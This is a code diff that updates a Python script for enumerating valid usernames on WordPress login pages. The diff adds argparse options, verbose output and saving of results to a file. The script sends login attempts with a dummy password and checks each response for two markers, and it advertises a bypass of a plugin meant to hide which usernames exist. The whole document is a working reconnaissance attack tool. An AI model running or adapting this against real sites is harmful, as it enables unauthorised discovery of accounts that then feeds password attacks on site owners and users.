@@ -4,20 +4,21 @@
 try:
 	import requests
 	import sys
+	import argparse
 	import ssl
 except Exception,e:
 	print "[!] Error: "+str(e)
-	print "[*] Make sure you have the following Python modules installed:\n\trequests, sys, ssl"
+	print "[*] Make sure you have the following Python modules installed:\n\trequests, argparse, ssl"
 	exit(0)
 
-if len(sys.argv)!=3:
-	print "\nUsage: " + sys.argv[0] + " <wordpress_target> <username_file>"
-	print "Example: " + sys.argv[0] + " http://192.168.1.1/wordpress users.txt"
-	print "\nTechnique Reference:\nT1 = Check for 'value=\"<username>\"'\nT2 = Check for \"document.getElementById('user_pass')\"\n"
-	sys.exit(0)
-
-target = sys.argv[1]
-user_file = sys.argv[2]
+parser = argparse.ArgumentParser(description="WordPress login page user enumeration. Supports 'Unified Login Error Messages' plugin bypass. Technique Reference:\nT1 = Check for 'value=\"<username>\"'\nT2 = Check for \"document.getElementById('user_pass')\"\n")
+parser.add_argument('-t','--target', help='WordPress target', required=True)
+parser.add_argument('-u','--users', help='File containing usernames', required=True)
+parser.add_argument('-o','--outfile', help='Save output in file')
+parser.add_argument('-v','--verbose', help='Show verbose message', action='store_const', const=True)
+args = parser.parse_args()
+target = args.target.encode('utf-8')
+user_file = args.users.encode('utf-8')
 
 f = open(user_file, "r")
 user_list = f.readlines()
@@ -36,6 +37,8 @@ except:
 for user in user_list:
 	try:
 		user = (user.replace("\r", "")).replace("\n", "")
+		if args.verbose:
+			print "[-] Trying: " + user
 		post_data = {"log":user, "pwd":"AnyInvalidPass", "wp-submit":"Log In", "redirect_to":target+"/wp-admin/", "testcookie":"1"}
 		#r = requests.post(target+"/wp-login.php", data=post_data, proxies=proxies, cookies=cookies, verify=False)
 		r = requests.post(target+"/wp-login.php", data=post_data, cookies=cookies, verify=False)
@@ -48,8 +51,16 @@ for user in user_list:
 		#print int(sc.find(check1))
 		if int(sc.find(check1)) > -1:
 			print "[T1] Valid user: "+user
+			if args.outfile:
+				f = open(args.outfile, "a")
+				f.write("[T1] Valid user: "+user+"\n")
+				f.close()
 		else:
 			if int(sc.find(check2)) > -1:
 				print "[T2] Valid user: "+user
-	except:
+				if args.outfile:
+					f = open(args.outfile, "a")
+					f.write("[T2] Valid user: "+user+"\n")
+					f.close()
+	except Exception,e:
 		print "Exception occurred"
